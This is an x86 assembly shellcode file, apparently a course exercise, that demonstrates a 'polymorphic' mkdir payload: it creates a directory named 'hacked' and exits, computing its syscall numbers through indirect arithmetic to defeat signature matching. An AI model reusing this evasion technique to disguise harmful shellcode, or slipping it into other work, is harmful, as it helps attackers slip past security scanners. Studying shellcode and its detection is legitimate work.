;; mkdir_mkdir_poly_shellcode.nasm
; Author: Mutti K
; Purpose: Demonstrate polymorphic version of mkdir shellcode.

global _start

section .text
_start:
	jmp short Label1
Label2:
	pop esi ; Store address of new dir name 'hacked'
	xor edx,edx
	mov eax,0x1e
	mov ecx, 0x5
	div ecx ; equates to 30 / 5 = 6, EAX = 6
	mov [esi+eax],edx ; null terminate string 'hacked'
	;syscall mkdir() 0x27
	mul eax ; eax already has 0x6 and we just 6*6 = 36d
	add eax, 0x2 ; +2
	inc eax ; + 1 and eax  = 39d = 0x27
	lea ebx,[esi] ; Load address of new dir name 'hacked'
	mov cx,0x1ed ; new dir mode 0x1ed = 755 octal
	int 0x80
	; mkdir returns eax=0x0 on success
	;syscall exit() 0x01
	inc eax ; lets assume we had success and eax = 0 
	xor ebx,ebx
	int 0x80
Label1:
	call Label2
	hacked: db 0x68,0x61,0x63,0x6B,0x65,0x64
